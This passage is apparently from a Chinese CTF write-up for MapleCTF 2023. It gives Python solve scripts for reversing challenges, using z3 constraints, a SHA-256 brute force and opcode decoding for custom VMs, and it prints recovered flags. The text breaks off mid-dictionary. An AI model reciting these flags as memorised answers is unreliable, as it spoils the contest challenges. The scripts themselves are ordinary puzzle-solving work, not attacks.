<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Solver实例</span></span><br><span class="line">solver = Solver()</span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">b = Int(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="comment"># solver.add(a * 4 + b * 5 == 127)</span></span><br><span class="line"><span class="comment"># solver.add(a &gt; 0)</span></span><br><span class="line"><span class="comment"># solver.add(b &gt; 0)</span></span><br><span class="line"><span class="comment"># solver.add(a + b &lt; 30)</span></span><br><span class="line"><span class="comment"># solutions = []</span></span><br><span class="line"><span class="comment"># while solver.check() == sat:</span></span><br><span class="line"><span class="comment">#     model = solver.model()</span></span><br><span class="line"><span class="comment">#     a_val = model[a].as_long()</span></span><br><span class="line"><span class="comment">#     b_val = model[b].as_long()</span></span><br><span class="line"><span class="comment">#     solutions.append((a_val, b_val))</span></span><br><span class="line"><span class="comment">#     solver.add(Or(a != a_val, b != b_val))</span></span><br><span class="line"><span class="comment"># for sol in solutions:</span></span><br><span class="line"><span class="comment">#     print(sol)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---</span></span><br><span class="line">solver.add((a * <span class="number">6</span> + b * <span class="number">13</span>) % <span class="number">3</span> == <span class="number">1</span>)</span><br><span class="line">solver.add((a * <span class="number">6</span> + b * <span class="number">13</span>) % <span class="number">4</span> == <span class="number">3</span>)</span><br><span class="line">solver.add((a * <span class="number">6</span> + b * <span class="number">13</span>) % <span class="number">5</span> == <span class="number">1</span>)</span><br><span class="line">solver.add(a + b &lt;= <span class="number">6</span>)</span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(solver.model())</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---</span></span><br></pre></td></tr></table></figure>
<p><a href="http://exp.py">exp.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">9</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">5</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">4</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">2</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="number">80673</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 999999999999999999555555555554442</span></span><br><span class="line"><span class="comment"># 80673</span></span><br></pre></td></tr></table></figure>
<h3 id="javiescript"><a class="markdownIt-Anchor" href="#javiescript">#</a> JavieScript</h3>
<p>源程序看起来就有各种问题…</p>
<p>不过按照字符数量直接爆破即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_string</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(s.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">possible_values_for_one = <span class="string">&#x27;1234567890abcdef&#x27;</span></span><br><span class="line"></span><br><span class="line">possible_values_for_two = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_=+[]&#123;&#125;|;:,.&lt;&gt;?/\\\&#x27;&quot;&#x27;</span></span><br><span class="line"><span class="comment"># possible_values_for_two = string.printable[:-5]  # -5 to exclude whitespace and control characters</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_fleg = <span class="string">&quot;maple&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> possible_values_for_two:</span><br><span class="line">    <span class="keyword">for</span> val_one <span class="keyword">in</span> possible_values_for_two:</span><br><span class="line">        <span class="keyword">for</span> char_two <span class="keyword">in</span> possible_values_for_two:</span><br><span class="line">            temp_fleg = base_fleg + val_one  + <span class="string">&#x27;a&#x27;</span> + i + <span class="string">&#x27;a&#x27;</span> + char_two * <span class="number">4</span> + <span class="string">&#x27;as&#x27;</span> + <span class="string">&quot;_are_a_mId_FruiT&#125;&quot;</span></span><br><span class="line">            <span class="comment"># print(temp_fleg)</span></span><br><span class="line">            <span class="keyword">if</span> hash_string(temp_fleg) == <span class="string">&quot;bfe06d1e92942a0eca51881a879a0a9aef3fe75acaece04877eb0a26ceb8710d&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Found fleg:&quot;</span>, temp_fleg)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line"><span class="comment"># maple&#123;baNannnnas_are_a_mId_FruiT&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="tarpit"><a class="markdownIt-Anchor" href="#tarpit">#</a> tarpit</h3>
<p>没见过的虚拟机，可以调着看他大概的行为（这里的注释不一定完全准确）</p>
<p><img loading="lazy" data-src="mapleCTF2023/image-20231001202626013.png" alt="image-20231001202626013"></p>
<p>其本身的 opcode 非常有规律，每五个数字会反复出现，而且有明显的指令 0 4 8，简单调试猜测可以发现它会统计该数字的出现次数，直接转化成 ascii，脚本提取即可（这样提取会把中间的一些指令段识别进来，加了个 count &gt;= 40 的判断就刚好可以筛掉）</p>
<p><a href="http://exp.py">exp.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode = [...]</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">h = <span class="number">0</span></span><br><span class="line">d = <span class="number">0x71</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(opcode), <span class="number">5</span>):</span><br><span class="line">    h = opcode[i]</span><br><span class="line">    <span class="keyword">if</span> (d == h):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> (d != h):</span><br><span class="line">        <span class="keyword">if</span> (count &gt;= <span class="number">40</span>):</span><br><span class="line">            flag += <span class="built_in">chr</span>(count + <span class="number">1</span>)</span><br><span class="line">        d = h</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># maple&#123;m1n5ky_m4ch1n35_4r3_c00l&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="most_harmless"><a class="markdownIt-Anchor" href="#most_harmless">#</a> most_harmless</h3>
<p>挺奇妙的，也算虚拟机吧？但是跑不起来，远程也跑不动，应该确实效率不好说…</p>
<p>app.py 好理解，就是拿 flag 去拼接成一个语法，放在 out.py 里面跑类型，但是这玩意初见以为是 lambda 算子那种图灵完备可以做很多事情的东西，这里只是做了一个映射，距离说明就是这里实际上就是串联了一串字符而已</p>
<p><img loading="lazy" data-src="mapleCTF2023/image-20231001204403663.png" alt="image-20231001204403663"></p>
<p>然后有一个指示，从 29 开始（一开始没看见，搜了一下它的头尾，发现确实是 29，然后映射出来就行楽）</p>
<p><a href="http://exp.py">exp.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = &#123;<span class="string">&#x27;01&#x27;</span>:<span class="string">&#x27;12&#x27;</span>,<span class="string">&#x27;01&#x27;</span>:<span class="string">&#x27;12&#x27;</span>,<span class="string">&#x27;12&#x27;</span>:<span class="string">&#x27;08&#x27;</span>,<span class="string">&#x27;12&#x27;</span>:<span class="string">&#x27;08&#x27;</span>,<span class="string">&#x27;02&#x27;</span>:<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;02&#x27;</span>:<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>:<span class="string">&#x27;06&#x27;</span>,<span class="string">&#x27;30&#x27;</span>:<span class="string">&#x27;06&#x27;</span>,<span class="string">&#x27;03&#x27;</span>:<span class="string">&#x27;05&#x27;</span>,<span class="string">&#x27;03&#x27;</span>:<span class="string">&#x27;05&#x27;</span>,<span class="string">&#x27;04&#x27;</span>:<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;04&#x27;</span>:<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;05&#x27;</span>:<span class="string">&#x27;45&#x27;</span>,<span class="string">&#x27;05&#x27;</span>:<span class="string">&#x27;45&#x27;</span>,<span class="string">&#x27;06&#x27;</span>:<span class="string">&#x27;46&#x27;</span>,<span class="string">&#x27;06&#x27;</span>:<span class="string">&#x27;46&#x27;</span>,<span class="string">&#x27;07&#x27;</span>:<span class="string">&#x27;24&#x27;</span>,<span class="string">&#x27;07&#x27;</span>:<span class="string">&#x27;24&#x27;</span>,<span class="string">&#x27;08&#x27;</span>:<span class="string">&#x27;61&#x27;</span>,<span class="string">&#x27;08&#x27;</span>:<span class="string">&#x27;61&#x27;</span>,<span class="string">&#x27;09&#x27;</span>:<span class="string">&#x27;58&#x27;</span>,<span class="string">&#x27;09&#x27;</span>:<span class="string">&#x27;58&#x27;</span>,<span class="string">&#x27;10&#x27;</span>:<span class="string">&#x27;68&#x27;</span>,<span class="string">&#x27;10&#x27;</span>:<span class="string">&#x27;68&#x27;</span>,<span class="string">&#x27;11&#x27;</span>:<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;11&#x27;</span>:<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;13&#x27;</span>:<span class="string">&#x27;40&#x27;</span>,<span class="string">&#x27;13&#x27;</span>:<span class="string">&#x27;40&#x27;</span>,<span class="string">&#x27;14&#x27;</span>:<span class="string">&#x27;38&#x27;</span>,<span class="string">&#x27;14&#x27;</span>:<span class="string">&#x27;38&#x27;</span>,<span class="string">&#x27;15&#x27;</span>:<span class="string">&#x27;65&#x27;</span>,<span class="string">&#x27;15&#x27;</span>:<span class="string">&#x27;65&#x27;</span>,<span class="string">&#x27;16&#x27;</span>:<span class="string">&#x27;67&#x27;</span>,<span class="string">&#x27;16&#x27;</span>:<span class="string">&#x27;67&#x27;</span>,<span class="string">&#x27;17&#x27;</span>:<span class="string">&#x27;11&#x27;</span>,<span class="string">&#x27;17&#x27;</span>:<span class="string">&#x27;11&#x27;</span>,<span class="string">&#x27;18&#x27;</span>:<span class="string">&#x27;02&#x27;</span>,<span class="string">&#x27;18&#x27;</span>:<span class="string">&#x27;02&#x27;</span>,<span class="string">&#x27;19&#x27;</span>:<span class="string">&#x27;39&#x27;</span>,<span class="string">&#x27;19&#x27;</span>:<span class="string">&#x27;39&#x27;</span>,<span class="string">&#x27;20&#x27;</span>:<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;20&#x27;</span>:<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;21&#x27;</span>:<span class="string">&#x27;43&#x27;</span>,<span class="string">&#x27;21&#x27;</span>:<span class="string">&#x27;43&#x27;</span>,<span class="string">&#x27;22&#x27;</span>:<span class="string">&#x27;51&#x27;</span>,<span class="string">&#x27;22&#x27;</span>:<span class="string">&#x27;51&#x27;</span>,<span class="string">&#x27;23&#x27;</span>:<span class="string">&#x27;63&#x27;</span>,<span class="string">&#x27;23&#x27;</span>:<span class="string">&#x27;63&#x27;</span>,<span class="string">&#x27;24&#x27;</span>:<span class="string">&#x27;59&#x27;</span>,<span class="string">&#x27;24&#x27;</span>:<span class="string">&#x27;59&#x27;</span>,<span class="string">&#x27;25&#x27;</span>:<span class="string">&#x27;62&#x27;</span>,<span class="string">&#x27;25&#x27;</span>:<span class="string">&#x27;62&#x27;</span>,<span class="string">&#x27;26&#x27;</span>:<span class="string">&#x27;53&#x27;</span>,<span class="string">&#x27;26&#x27;</span>:<span class="string">&#x27;53&#x27;</span>,<span class="string">&#x27;27&#x27;</span>:<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;27&#x27;</span>:<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;28&#x27;</span>:<span class="string">&#x27;69&#x27;</span>,<span class="string">&#x27;28&#x27;</span>:<span class="string">&#x27;69&#x27;</span>,<span class="string">&#x27;29&#x27;</span>:<span class="string">&#x27;31&#x27;</span>,<span class="string">&#x27;29&#x27;</span>:<span class="string">&#x27;31&#x27;</span>,<span class="string">&#x27;31&#x27;</span>:<span class="string">&#x27;57&#x27;</span>,<span class="string">&#x27;31&#x27;</span>:<span class="string">&#x27;57&#x27;</span>,<span class="string">&#x27;32&#x27;</span>:<span class="string">&#x27;25&#x27;</span>,<span class="string">&#x27;32&#x27;</span>:<span class="string">&#x27;25&#x27;</span>,<span class="string">&#x27;33&#x27;</span>:<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;33&#x27;</span>:<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;34&#x27;</span>:<span class="string">&#x27;66&#x27;</span>,<span class="string">&#x27;34&#x27;</span>:<span class="string">&#x27;66&#x27;</span>,<span class="string">&#x27;35&#x27;</span>:<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;35&#x27;</span>:<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;36&#x27;</span>:<span class="string">&#x27;09&#x27;</span>,<span class="string">&#x27;36&#x27;</span>:<span class="string">&#x27;09&#x27;</span>,<span class="string">&#x27;37&#x27;</span>:<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;37&#x27;</span>:<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;38&#x27;</span>:<span class="string">&#x27;03&#x27;</span>,<span class="string">&#x27;38&#x27;</span>:<span class="string">&#x27;03&#x27;</span>,<span class="string">&#x27;39&#x27;</span>:<span class="string">&#x27;70&#x27;</span>,<span class="string">&#x27;39&#x27;</span>:<span class="string">&#x27;70&#x27;</span>,<span class="string">&#x27;40&#x27;</span>:<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;40&#x27;</span>:<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;41&#x27;</span>:<span class="string">&#x27;55&#x27;</span>,<span class="string">&#x27;41&#x27;</span>:<span class="string">&#x27;55&#x27;</span>,<span class="string">&#x27;42&#x27;</span>:<span class="string">&#x27;52&#x27;</span>,<span class="string">&#x27;42&#x27;</span>:<span class="string">&#x27;52&#x27;</span>,<span class="string">&#x27;43&#x27;</span>:<span class="string">&#x27;60&#x27;</span>,<span class="string">&#x27;43&#x27;</span>:<span class="string">&#x27;60&#x27;</span>,<span class="string">&#x27;44&#x27;</span>:<span class="string">&#x27;01&#x27;</span>,<span class="string">&#x27;44&#x27;</span>:<span class="string">&#x27;01&#x27;</span>,<span class="string">&#x27;45&#x27;</span>:<span class="string">&#x27;64&#x27;</span>,<span class="string">&#x27;45&#x27;</span>:<span class="string">&#x27;64&#x27;</span>,<span class="string">&#x27;46&#x27;</span>:<span class="string">&#x27;71&#x27;</span>,<span class="string">&#x27;46&#x27;</span>:<span class="string">&#x27;71&#x27;</span>,<span class="string">&#x27;47&#x27;</span>:<span class="string">&#x27;20&#x27;</span>,<span class="string">&#x27;47&#x27;</span>:<span class="string">&#x27;20&#x27;</span>,<span class="string">&#x27;48&#x27;</span>:<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;48&#x27;</span>:<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;49&#x27;</span>:<span class="string">&#x27;56&#x27;</span>,<span class="string">&#x27;49&#x27;</span>:<span class="string">&#x27;56&#x27;</span>,<span class="string">&#x27;50&#x27;</span>:<span class="string">&#x27;33&#x27;</span>,<span class="string">&#x27;50&#x27;</span>:<span class="string">&#x27;33&#x27;</span>,<span class="string">&#x27;51&#x27;</span>:<span class="string">&#x27;15&#x27;</span>,<span class="string">&#x27;51&#x27;</span>:<span class="string">&#x27;15&#x27;</span>,<span class="string">&#x27;52&#x27;</span>:<span class="string">&#x27;07&#x27;</span>,<span class="string">&#x27;52&#x27;</span>:<span class="string">&#x27;07&#x27;</span>,<span class="string">&#x27;53&#x27;</span>:<span class="string">&#x27;04&#x27;</span>,<span class="string">&#x27;53&#x27;</span>:<span class="string">&#x27;04&#x27;</span>,<span class="string">&#x27;54&#x27;</span>:<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;54&#x27;</span>:<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;55&#x27;</span>:<span class="string">&#x27;42&#x27;</span>,<span class="string">&#x27;55&#x27;</span>:<span class="string">&#x27;42&#x27;</span>,<span class="string">&#x27;56&#x27;</span>:<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;56&#x27;</span>:<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;57&#x27;</span>:<span class="string">&#x27;49&#x27;</span>,<span class="string">&#x27;57&#x27;</span>:<span class="string">&#x27;49&#x27;</span>,<span class="string">&#x27;58&#x27;</span>:<span class="string">&#x27;41&#x27;</span>,<span class="string">&#x27;58&#x27;</span>:<span class="string">&#x27;41&#x27;</span>,<span class="string">&#x27;59&#x27;</span>:<span class="string">&#x27;21&#x27;</span>,<span class="string">&#x27;59&#x27;</span>:<span class="string">&#x27;21&#x27;</span>,<span class="string">&#x27;60&#x27;</span>:<span class="string">&#x27;44&#x27;</span>,<span class="string">&#x27;60&#x27;</span>:<span class="string">&#x27;44&#x27;</span>,<span class="string">&#x27;61&#x27;</span>:<span class="string">&#x27;13&#x27;</span>,<span class="string">&#x27;61&#x27;</span>:<span class="string">&#x27;13&#x27;</span>,<span class="string">&#x27;62&#x27;</span>:<span class="string">&#x27;37&#x27;</span>,<span class="string">&#x27;62&#x27;</span>:<span class="string">&#x27;37&#x27;</span>,<span class="string">&#x27;63&#x27;</span>:<span class="string">&#x27;14&#x27;</span>,<span class="string">&#x27;63&#x27;</span>:<span class="string">&#x27;14&#x27;</span>,<span class="string">&#x27;64&#x27;</span>:<span class="string">&#x27;54&#x27;</span>,<span class="string">&#x27;64&#x27;</span>:<span class="string">&#x27;54&#x27;</span>,<span class="string">&#x27;65&#x27;</span>:<span class="string">&#x27;50&#x27;</span>,<span class="string">&#x27;66&#x27;</span>:<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;66&#x27;</span>:<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;65&#x27;</span>:<span class="string">&#x27;50&#x27;</span>,<span class="string">&#x27;67&#x27;</span>:<span class="string">&#x27;47&#x27;</span>,<span class="string">&#x27;67&#x27;</span>:<span class="string">&#x27;47&#x27;</span>,<span class="string">&#x27;68&#x27;</span>:<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;68&#x27;</span>:<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;69&#x27;</span>:<span class="string">&#x27;48&#x27;</span>,<span class="string">&#x27;69&#x27;</span>:<span class="string">&#x27;48&#x27;</span>,<span class="string">&#x27;70&#x27;</span>:<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;70&#x27;</span>:<span class="string">&#x27;18&#x27;</span>&#125;</span><br><span class="line">a = <span class="string">&#x27;29&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;&#x27;</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">while</span>(b != <span class="string">&#x27;71&#x27;</span>):</span><br><span class="line">    <span class="comment"># print(a,end=&#x27; -&gt; &#x27;)</span></span><br><span class="line">    <span class="built_in">list</span>.append(a)</span><br><span class="line">    b = data[a]</span><br><span class="line">    a = b</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">data_chr = &#123;<span class="string">&#x27;01&#x27;</span> : <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;01&#x27;</span> : <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;12&#x27;</span> : <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;12&#x27;</span> : <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;02&#x27;</span> : <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;02&#x27;</span> : <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;30&#x27;</span> : <span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;30&#x27;</span> : <span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;03&#x27;</span> : <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;03&#x27;</span> : <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;04&#x27;</span> : <span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;04&#x27;</span> : <span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;05&#x27;</span> : <span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;05&#x27;</span> : <span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;06&#x27;</span> : <span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;06&#x27;</span> : <span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;07&#x27;</span> : <span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;07&#x27;</span> : <span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;08&#x27;</span> : <span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;08&#x27;</span> : <span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;09&#x27;</span> : <span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;09&#x27;</span> : <span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;10&#x27;</span> : <span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;10&#x27;</span> : <span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;11&#x27;</span> : <span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;11&#x27;</span> : <span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;13&#x27;</span> : <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;13&#x27;</span> : <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;14&#x27;</span> : <span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;14&#x27;</span> : <span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;15&#x27;</span> : <span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;15&#x27;</span> : <span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;16&#x27;</span> : <span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;16&#x27;</span> : <span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;17&#x27;</span> : <span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;17&#x27;</span> : <span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;18&#x27;</span> : <span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;18&#x27;</span> : <span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;19&#x27;</span> : <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;19&#x27;</span> : <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;20&#x27;</span> : <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;20&#x27;</span> : <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;21&#x27;</span> : <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;21&#x27;</span> : <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;22&#x27;</span> : <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;22&#x27;</span> : <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;23&#x27;</span> : <span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;23&#x27;</span> : <span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;24&#x27;</span> : <span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;24&#x27;</span> : <span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;25&#x27;</span> : <span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;25&#x27;</span> : <span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;26&#x27;</span> : <span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;26&#x27;</span> : <span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;27&#x27;</span> : <span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;27&#x27;</span> : <span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;28&#x27;</span> : <span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;28&#x27;</span> : <span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;29&#x27;</span> : <span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;29&#x27;</span> : <span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;31&#x27;</span> : <span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;31&#x27;</span> : <span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;32&#x27;</span> : <span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;32&#x27;</span> : <span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;33&#x27;</span> : <span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;33&#x27;</span> : <span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;34&#x27;</span> : <span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;34&#x27;</span> : <span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;35&#x27;</span> : <span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;35&#x27;</span> : <span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;36&#x27;</span> : <span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;36&#x27;</span> : <span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;37&#x27;</span> : <span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;37&#x27;</span> : <span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;38&#x27;</span> : <span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;38&#x27;</span> : <span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;39&#x27;</span> : <span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;39&#x27;</span> : <span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;40&#x27;</span> : <span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;40&#x27;</span> : <span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;41&#x27;</span> : <span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;41&#x27;</span> : <span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;42&#x27;</span> : <span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;42&#x27;</span> : <span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;43&#x27;</span> : <span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;43&#x27;</span> : <span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;44&#x27;</span> : <span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;44&#x27;</span> : <span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;45&#x27;</span> : <span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;45&#x27;</span> : <span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;46&#x27;</span> : <span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;46&#x27;</span> : <span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;47&#x27;</span> : <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;47&#x27;</span> : <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;48&#x27;</span> : <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;48&#x27;</span> : <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;49&#x27;</span> : <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;49&#x27;</span> : <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;50&#x27;</span> : <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;50&#x27;</span> : <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;51&#x27;</span> : <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;51&#x27;</span> : <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;52&#x27;</span> : <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;52&#x27;</span> : <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;53&#x27;</span> : <span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;53&#x27;</span> : <span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;54&#x27;</span> : <span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;54&#x27;</span> : <span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;55&#x27;</span> : <span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;55&#x27;</span> : <span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;56&#x27;</span> : <span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;56&#x27;</span> : <span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;57&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;57&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;58&#x27;</span> : <span class="string">&#x27;_&#x27;</span>,<span 